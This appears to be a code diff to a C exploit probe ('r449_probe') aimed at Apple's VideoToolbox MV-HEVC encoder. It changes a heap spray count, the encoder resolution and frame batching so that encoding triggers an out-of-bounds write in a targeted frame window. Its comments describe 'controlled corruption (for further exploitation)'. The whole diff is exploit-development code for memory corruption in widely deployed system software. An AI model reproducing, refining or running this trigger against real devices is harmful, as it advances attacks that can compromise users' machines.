@@ -16992,7 +16992,7 @@ static void r449_probe(void) {
      * (b) Controlled corruption (for further exploitation)
      */
 
-    #define R449_SPRAY_COUNT 20
+    #define R449_SPRAY_COUNT 10
     #define R449_PROP_SIZE 128
     #define R449_ENCODE_COUNT 165
     #define R449_SCAN_MAGIC 0xDEADBEEF41414141ULL
@@ -17055,9 +17055,9 @@ static void r449_probe(void) {
     fflush(stdout);
 
     /* Step 3: Create MV-HEVC encoder and encode frames to trigger OOB */
-    rlog("  Step 3: Creating MV-HEVC encoder (160x90)...\n");
+    rlog("  Step 3: Creating MV-HEVC encoder (64x64)...\n");
     fflush(stdout);
-    int enc_w = 160, enc_h = 90;
+    int enc_w = 64, enc_h = 64;
     VTCompressionSessionRef enc = create_mvhevc_encoder(enc_w, enc_h, 1);
     if (!enc) {
         rlog("  ERROR: Failed to create MV-HEVC encoder\n");
@@ -17065,7 +17065,7 @@ static void r449_probe(void) {
     }
     rlog("  Encoder created successfully\n");
 
-    rlog("  Step 4: Encoding %d frames (targeting Table 2 OOB window 155-197)...\n", R449_ENCODE_COUNT);
+    rlog("  Step 4: Encoding %d frames in batches of 30 (OOB window 155-197)...\n", R449_ENCODE_COUNT);
     fflush(stdout);
 
     /* Reuse single pixel buffer to avoid memory pressure */
@@ -17095,18 +17095,19 @@ static void r449_probe(void) {
         if (est == noErr) enc_ok++;
         else enc_fail++;
 
-        /* Log progress every 25 frames */
-        if ((frame + 1) % 25 == 0) {
-            rlog("    Submitted %d/%d (ok=%d fail=%d)\n",
-                 frame + 1, R449_ENCODE_COUNT, enc_ok, enc_fail);
+        /* Flush every 30 frames to bound memory */
+        if ((frame + 1) % 30 == 0) {
+            VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+            rlog("    Batch %d: submitted %d/%d (ok=%d fail=%d) cb_count=%d\n",
+                 (frame + 1) / 30, frame + 1, R449_ENCODE_COUNT, enc_ok, enc_fail, g_cb_count);
             fflush(stdout);
         }
     }
     rlog("  Submission complete: ok=%d fail=%d\n", enc_ok, enc_fail);
     fflush(stdout);
 
-    /* Flush encoder — this blocks until all frames are processed */
-    rlog("  Flushing encoder...\n"); fflush(stdout);
+    /* Final flush */
+    rlog("  Final flush...\n"); fflush(stdout);
     VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
     rlog("  Flush done. cb_count=%d cb_status=%d\n", g_cb_count, (int)g_cb_status);
     fflush(stdout);
